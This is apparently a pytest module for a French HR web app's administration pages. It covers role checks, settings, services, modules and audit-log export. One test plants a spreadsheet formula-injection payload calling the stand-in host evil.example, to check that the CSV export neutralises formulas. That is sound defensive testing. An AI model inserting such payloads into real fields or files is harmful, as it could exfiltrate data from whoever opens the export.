"""Administration : critères d'acceptation de docs/modules/04-administration.md."""

import csv
import io
import json

import pytest
from django.core.files.uploadedfile import SimpleUploadedFile

from apps.core.models import AuditLog, Company, CompanyModule, Module, Service
from apps.core.tenancy import tenant_context
from apps.people.models import Employee, Role
from apps.people.tests.conftest import (  # noqa: F401 (fixtures pytest utilisées par ce module)
    image_bytes,
    private_media,
)
from tests.factories import EmployeeFactory, ServiceFactory

pytestmark = pytest.mark.django_db

PAGES = [
    "/administration/",
    "/administration/utilisateurs/",
    "/administration/structure/",
    "/administration/modules/",
    "/administration/journal/",
]


def actions(company_data):
    with tenant_context(company_data.company):
        return list(AuditLog.objects.values_list("action", flat=True))


@pytest.mark.parametrize("who", ["employee", "manager", "hr"])
@pytest.mark.parametrize("url", PAGES)
def test_only_admins_reach_the_administration(client_for, company_a, who, url):
    response = client_for(getattr(company_a, who)).get(url)
    assert response.status_code == 403
    assert "Accès non autorisé" in response.content.decode()


@pytest.mark.parametrize("url", PAGES)
def test_admin_reaches_every_tab(client_for, company_a, url):
    content = client_for(company_a.admin).get(url).content.decode()
    assert "espace client isolé" in content
    assert "Journal d&#x27;activité" in content or "Journal d'activité" in content


def test_menu_shows_administration_to_admins_only(client_for, company_a):
    assert "/administration/" in client_for(company_a.admin).get("/").content.decode()
    assert 'href="/administration/"' not in client_for(company_a.hr).get("/").content.decode()


# ---------- Entreprise ----------


def test_company_settings_are_validated_saved_and_logged(client_for, company_a):
    client = client_for(company_a.admin)
    bad = client.post("/administration/", {"name": "", "telework_max_per_week": "7"})
    content = bad.content.decode()
    assert bad.status_code == 422
    assert "Indiquez le nom de l&#x27;entreprise." in content or "Indiquez le nom" in content
    assert "Saisissez un nombre entier entre 0 et 5." in content
    ok = client.post(
        "/administration/",
        {"name": "Exemple SAS", "telework_max_per_week": "3", "telework_auto_approve": "on"},
    )
    assert ok.status_code == 302
    company = Company.objects.get(pk=company_a.company.pk)
    assert company.telework_max_per_week == 3 and company.telework_auto_approve
    assert not company.summer_leave_hr_step
    assert "company.settings_updated" in actions(company_a)


def test_logo_appears_on_the_login_page(client_for, company_a, anonymous_client):
    logo = SimpleUploadedFile("logo.png", image_bytes(), content_type="image/png")
    client_for(company_a.admin).post(
        "/administration/",
        {"name": "Exemple SAS", "telework_max_per_week": "2", "logo_upload": logo},
    )
    page = anonymous_client(company_a.company).get("/connexion/").content.decode()
    url = page.split('class="company-logo self-start" src="')[1].split('"')[0]
    assert anonymous_client(company_a.company).get(url).status_code == 200


# ---------- Utilisateurs et profils ----------


def test_users_tab_lists_people_with_account_state(client_for, company_a):
    content = client_for(company_a.admin).get("/administration/utilisateurs/").content.decode()
    assert company_a.employee.email in content
    assert "Invitation envoyée" in content  # fiche « pending » avec invitation
    assert "Renvoyer l&#x27;invitation" in content or "Renvoyer l'invitation" in content
    assert "Vous ne pouvez pas modifier votre propre profil" in content


def test_role_change_needs_confirmation_and_is_logged(client_for, company_a):
    client = client_for(company_a.admin)
    url = f"/administration/utilisateurs/{company_a.employee.public_id}/profil/"
    modal = client.get(url, {"role": Role.HR}).content.decode()
    assert "Changer le profil de" in modal and "La double authentification" in modal
    response = client.post(url, {"role": Role.HR})
    assert json.loads(response["HX-Trigger"])["toast"]["title"] == "Profil modifié"
    assert Employee.all_companies.get(pk=company_a.employee.pk).role == Role.HR
    assert "people.role_changed" in actions(company_a)


def test_own_role_cannot_be_changed(client_for, company_a):
    response = client_for(company_a.admin).post(
        f"/administration/utilisateurs/{company_a.admin.public_id}/profil/", {"role": Role.HR}
    )
    assert response.status_code == 409
    assert "Vous ne pouvez pas modifier votre propre profil." in response["HX-Trigger"]


def test_demoting_the_last_admin_is_refused(client_for, company_a):
    from apps.people import services as people

    # Deux administrateurs : l'un peut rétrograder l'autre.
    other = EmployeeFactory(company=company_a.company, role=Role.ADMIN)
    response = client_for(company_a.admin).post(
        f"/administration/utilisateurs/{other.public_id}/profil/", {"role": Role.HR}
    )
    assert json.loads(response["HX-Trigger"])["toast"]["title"] == "Profil modifié"
    # Il n'en reste qu'un : toute rétrogradation est refusée avec un message explicite.
    with tenant_context(company_a.company), pytest.raises(people.PeopleError) as error:
        people.change_role(company_a.admin, Role.EMPLOYEE, actor=None)
    assert "dernier administrateur actif" in str(error.value.message)
    assert Employee.all_companies.get(pk=company_a.admin.pk).role == Role.ADMIN


def test_invitation_can_be_sent_again(client_for, company_a, run_tasks):
    from django.core import mail

    response = client_for(company_a.admin).post(
        f"/administration/utilisateurs/{company_a.pending.public_id}/invitation/"
    )
    assert json.loads(response["HX-Trigger"])["toast"]["title"] == "Invitation envoyée"
    run_tasks()
    assert mail.outbox[-1].to == [company_a.pending.email]


# ---------- Services et sites ----------


def test_names_are_unique_ignoring_case(client_for, company_a):
    client = client_for(company_a.admin)
    response = client.post(
        "/administration/structure/services/ajouter/", {"name": "support CLIENT"}
    )
    assert response.status_code == 422 and "Ce nom existe déjà." in response.content.decode()
    ok = client.post("/administration/structure/services/ajouter/", {"name": "Finance"})
    assert ok.status_code == 204
    assert "company.services_added" in actions(company_a)


def test_rename(client_for, company_a):
    client_for(company_a.admin).post(
        f"/administration/structure/sites/{company_a.site.pk}/renommer/", {"name": "Lyon Part-Dieu"}
    )
    with tenant_context(company_a.company):
        assert company_a.site.__class__.objects.get(pk=company_a.site.pk).name == "Lyon Part-Dieu"
    assert "company.sites_renamed" in actions(company_a)


def test_deleting_a_used_service_is_impossible(client_for, company_a):
    client = client_for(company_a.admin)
    url = f"/administration/structure/services/{company_a.service.pk}/supprimer/"
    content = client.get(url).content.decode()
    assert "Suppression impossible" in content
    assert "est utilisé par" in content and "collaborateurs" in content
    assert f"/annuaire/?service={company_a.service.pk}" in content
    assert client.post(url).status_code == 409
    with tenant_context(company_a.company):
        assert Service.objects.filter(pk=company_a.service.pk).exists()


def test_deleting_an_unused_service(client_for, company_a):
    unused = ServiceFactory(company=company_a.company, name="Inutile")
    client = client_for(company_a.admin)
    url = f"/administration/structure/services/{unused.pk}/supprimer/"
    assert (
        "Aucun collaborateur n&#x27;y est rattaché." in client.get(url).content.decode()
        or "Aucun collaborateur" in client.get(url).content.decode()
    )
    assert client.post(url).status_code == 204
    assert "company.services_deleted" in actions(company_a)


# ---------- Modules ----------


def test_disabling_telework_removes_it_and_keeps_data(client_for, company_a):
    from apps.core.navigation import build_nav

    client = client_for(company_a.admin)
    modal = client.get(f"/administration/modules/{Module.TELEWORK}/").content.decode()
    assert "Le module disparaîtra du menu de tous les utilisateurs." in modal
    response = client.post(f"/administration/modules/{Module.TELEWORK}/", {"enabled": "0"})
    assert response["HX-Refresh"] == "true"
    with tenant_context(company_a.company):
        assert not CompanyModule.objects.get(module=Module.TELEWORK).enabled
    modules = set(Module.values) - {Module.TELEWORK}
    keys = [i.key for g in build_nav(company_a.employee, modules) for i in g.items]
    assert "telework" not in keys
    assert "company.module_disabled" in actions(company_a)
    page = client.get("/administration/modules/").content.decode()
    assert "Non disponible" in page and "Toujours activé" in page


def test_enabling_is_immediate(client_for, company_a):
    with tenant_context(company_a.company):
        CompanyModule.objects.filter(module=Module.SURVEYS).update(enabled=False)
    client_for(company_a.admin).post(f"/administration/modules/{Module.SURVEYS}/", {"enabled": "1"})
    with tenant_context(company_a.company):
        assert CompanyModule.objects.get(module=Module.SURVEYS).enabled


# ---------- Journal ----------


def test_journal_lists_searches_and_exports(client_for, company_a):
    client = client_for(company_a.admin)
    client.post("/administration/structure/services/ajouter/", {"name": "Comptabilité"})
    content = client.get("/administration/journal/?q=Comptabilit").content.decode()
    assert "Comptabilité" in content and company_a.admin.full_name in content
    export = client.get("/administration/journal/export/")
    assert export["Content-Type"].startswith("text/csv")
    body = export.content.decode("utf-8")
    assert body.startswith("﻿Date;Heure;Personne;Action;Résumé")
    assert "Comptabilité" in body
    assert "audit.exported" in actions(company_a)


def test_journal_export_neutralises_formulas(client_for, company_a):
    """Une RH donne un prénom-formule à un salarié ; l'export ouvert par l'administrateur ne
    doit contenir aucune cellule exécutable."""
    formula = '=HYPERLINK("https://evil.example/?"&A2;"x")'
    employee = company_a.employee
    client_for(company_a.hr).post(
        f"/annuaire/{employee.public_id}/modifier/",
        {
            "first_name": formula,
            "last_name": employee.last_name,
            "email": employee.email,
            "job_title": "Analyste",
            "service": company_a.service.pk,
            "site": company_a.site.pk,
            "arrival_date": "2024-01-08",
        },
    )
    client_for(employee).post(
        "/annuaire/mes-coordonnees/", {"phone": "01 02 03 04 05", "office": "B12"}
    )
    body = client_for(company_a.admin).get("/administration/journal/export/").content.decode()
    rows = list(csv.reader(io.StringIO(body.removeprefix("\ufeff")), delimiter=";"))
    cells = [cell for row in rows for cell in row]
    assert any(cell.startswith(f"'{formula}") for cell in cells)  # colonne Personne
    assert not [cell for cell in cells if cell[:1] in ("=", "+", "-", "@", "\t", "\r")]


def test_every_action_of_the_tab_is_logged(client_for, company_a):
    client = client_for(company_a.admin)
    client.post("/administration/", {"name": "Exemple", "telework_max_per_week": "2"})
    client.post("/administration/structure/sites/ajouter/", {"name": "Nantes"})
    client.post(f"/administration/modules/{Module.CAREERS}/", {"enabled": "0"})
    client.post(
        f"/administration/utilisateurs/{company_a.employee.public_id}/profil/",
        {"role": Role.MANAGER},
    )
    logged = set(actions(company_a))
    assert {
        "company.settings_updated",
        "company.sites_added",
        "company.module_disabled",
        "people.role_changed",
    } <= logged


def test_journal_period_must_be_consistent(client_for, company_a):
    content = (
        client_for(company_a.admin)
        .get("/administration/journal/?du=2026-10-10&au=2026-10-01")
        .content.decode()
    )
    assert "La fin doit être après le début." in content
